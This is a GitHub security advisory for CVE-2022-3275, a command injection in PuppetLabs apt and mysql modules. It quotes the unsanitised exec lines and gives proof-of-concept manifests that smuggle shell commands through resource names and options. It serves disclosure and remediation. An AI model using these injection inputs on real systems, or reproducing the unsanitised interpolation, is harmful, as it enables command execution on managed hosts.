---
title: 'Puppetlabs: Command injection via module arguments'
severity: High
ghsa_id: GHSA-9jvw-qr6w-9wvc
cve_id: CVE-2022-3275
weaknesses: []
products:
- ecosystem: Puppetlabs
  package_name: Enterprise
  affected_versions: '2017.3'
  patched_versions: ''
cvss: null
credits:
- github_user_id: koczkatamas
  name: Tamás Koczka
  avatar: https://avatars.githubusercontent.com/u/2608082?s=40&v=4
---

## Summary
Running interpreted shell commands without sanitation allows command line injection in multiple PuppetLabs modules via module arguments.

## Severity
High - Insufficient data validation allows command injection in multiple modules.

## Proof of Concepts

### [puppetlabs-apt/manifests/ppa.pp:86](https://github.com/puppetlabs/puppetlabs-apt/blob/b33313fd5d58de39e84fc242a122b5b652732f14/manifests/ppa.pp#L86)

```
command => "/usr/bin/add-apt-repository ${options} ${name} || (rm ${::apt::sources_list_d}/${sources_list_d_filename} && false)",
```

PoC injection via the `name` variable:
```
include apt
apt::ppa { 'ppa:x||touch INJECTION2||': }
```

The issue was reproduced by putting the PoC into `test.pp` and running `puppet apply --debug test.pp` and verifying that a file called `INJECTION2` was created.

PoC injection via the `options` variable:
```
include apt
apt::ppa { 'ppa:x': options => '||touch INJECTION||' }
```

### [puppetlabs-apt/manifests/mark.pp](https://github.com/puppetlabs/puppetlabs-apt/blob/main/manifests/mark.pp)

```
PoC: apt::mark { 'x;touch INJECTION3': setting => auto }
```

### [puppetlabs-mysql/manifests/db.pp:103](https://github.com/puppetlabs/puppetlabs-mysql/blob/4441ed5c02763ffa8557f5f5a6aa5686d143454b/manifests/db.pp#L103)

* Code: `command => "${import_cat_cmd} ${sql_inputs} | mysql ${dbname}"`
* Affected parameters: `$sql`, `$dbname` (defaults to `$name`) -- note: also `import_cat_cmd` but that is probably intended

### [puppetlabs-mysql/manifests/server/config.pp](https://github.com/puppetlabs/puppetlabs-mysql/blob/4441ed5c02763ffa8557f5f5a6aa5686d143454b/manifests/server/config.pp#L44)
```
mysql::server::options["mysqld"]["tmpdir"] = "||touch INJECTION||" (not verified)
```

### [puppetlabs-mysql/manifests/server/root_password.pp:32](https://github.com/puppetlabs/puppetlabs-mysql/blob/4441ed5c02763ffa8557f5f5a6aa5686d143454b/manifests/server/root_password.pp#L32)
```
mysql::server::install_secret_file
```
### [puppetlabs-mysql/manifests/server/service.pp:57](https://github.com/puppetlabs/puppetlabs-mysql/blob/4441ed5c02763ffa8557f5f5a6aa5686d143454b/manifests/server/service.pp#L57)
```
mysql::server::options["mysqld"]["socket"]
```

## Further Analysis
Remediation Guidelines:
#1 https://github.com/puppetlabs/puppetlabs-apt/commit/c26ad2a54f318b4d6fbe55f837b00cd6afd9f1eb - Aug 18
#2 https://github.com/puppetlabs/puppetlabs-apt/commit/eed10ea359d0fe144da90a8425cd14dc3c6c8f18 - Aug 12
#3 https://github.com/puppetlabs/puppetlabs-mysql/commit/547483f3816e7d8b0975992073e003feea8833ef - Aug 22
#4 https://github.com/puppetlabs/puppetlabs-mysql/commit/1c1291d27883fc41eab666eb65f3c85071d6c696 - Aug 22
#5 https://github.com/puppetlabs/puppetlabs-mysql/commit/90168d93834f329ca037f83bedc5b5e580955fb6 - Aug 23
#6 https://github.com/puppetlabs/puppetlabs-mysql/commit/cdaa8393e3fe9b8f971945ee8cb1f3e933902a0d - Aug 19

## Timeline
**Date reported**: 08/08/2022
**Date fixed**: 08/23/2022
**Date disclosed**: 10/06/2022